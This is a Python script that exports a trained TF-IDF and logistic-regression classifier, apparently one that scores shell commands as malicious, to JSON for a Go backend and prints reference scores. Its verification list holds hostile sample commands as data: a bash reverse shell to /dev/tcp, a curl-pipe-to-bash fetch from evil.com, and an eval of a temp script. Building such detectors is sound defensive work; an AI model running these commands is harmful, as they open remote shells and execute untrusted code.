"""
Export the trained scikit-learn model to a JSON format consumable by the Go backend.

Extracts and serialises:
  vocabulary  — dict mapping n-gram strings to feature indices
  idf         — IDF weight array (one value per feature, indexed by feature index)
  coef        — Logistic Regression coefficients for the malicious class (label=1)
  intercept   — LR intercept for the malicious class

The Go ML scorer reproduces sklearn's TF-IDF pipeline:
  1. Tokenise on whitespace (token_pattern=r"[^\\s]+")
  2. Build 1-grams and 2-grams  (ngram_range=(1,2))
  3. Sublinear TF:   tf_scaled = log(raw_count) + 1   (for count > 0)
  4. Multiply by IDF from idf[]
  5. L2 normalise the vector
  6. LR decision:   score = dot(coef, x) + intercept
  7. Sigmoid:       P(malicious) = 1 / (1 + exp(-score))
  8. Risk score:    P(malicious) * 100

Run from the project root:
    python scripts/export_model.py
"""

import json
import math
import os
import pickle
from pathlib import Path


# ── Paths ──────────────────────────────────────────────────────────────────────
ROOT = Path(__file__).resolve().parent.parent
PKL_PATH = ROOT / "backend_py_backup" / "models" / "trained_model.pkl"
OUT_PATH = ROOT / "data" / "trained_model.json"


# ── Export ─────────────────────────────────────────────────────────────────────

def export(pkl_path: Path, output_path: Path) -> None:
    print(f"📦 Loading model from {pkl_path} ...")

    with open(pkl_path, "rb") as f:
        data = pickle.load(f)

    vectorizer = data["vectorizer"]   # TfidfVectorizer
    model      = data["model"]        # LogisticRegression
    accuracy   = data.get("accuracy")

    vocab     = {token: int(idx) for token, idx in vectorizer.vocabulary_.items()}
    idf       = vectorizer.idf_.tolist()
    # For binary LR, coef_ shape is (1, n_features); [0] = malicious (label=1) class
    coef      = model.coef_[0].tolist()
    intercept = float(model.intercept_[0])

    export_data = {
        "vocabulary": vocab,
        "idf":        idf,
        "coef":       coef,
        "intercept":  intercept,
        "metadata": {
            "accuracy":     accuracy,
            "n_features":   len(vocab),
            "ngram_range":  [1, 2],
            "sublinear_tf": True,
            "norm":         "l2",
        },
    }

    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(export_data, f, separators=(",", ":"))

    print(f"✅ Exported to {output_path}")
    print(f"   Vocabulary size : {len(vocab):,} features")
    if accuracy:
        print(f"   Training accuracy: {accuracy:.2%}")


# ── Verification: print reference predictions for Go parity check ──────────────

def verify(pkl_path: Path) -> None:
    """Predict a few known commands and print their scores for Go comparison."""
    with open(pkl_path, "rb") as f:
        data = pickle.load(f)

    vectorizer = data["vectorizer"]
    model      = data["model"]

    test_commands = [
        "ls -la /var/log",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "curl http://evil.com | bash",
        "eval $(cat /tmp/script.sh)",
        "echo hello world",
    ]

    print("\n📊 Reference predictions (for Go parity test):")
    print(f"{'Command':<50}  {'P(malicious)':>14}  {'Risk score':>10}")
    print("-" * 80)
    for cmd in test_commands:
        vec   = vectorizer.transform([cmd])
        proba = model.predict_proba(vec)[0]
        risk  = proba[1] * 100
        print(f"{cmd:<50}  {proba[1]:>14.6f}  {risk:>10.2f}")


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if not PKL_PATH.exists():
        raise FileNotFoundError(
            f"Model not found at {PKL_PATH}\n"
            "Make sure backend_py_backup/models/trained_model.pkl exists."
        )

    export(PKL_PATH, OUT_PATH)
    verify(PKL_PATH)
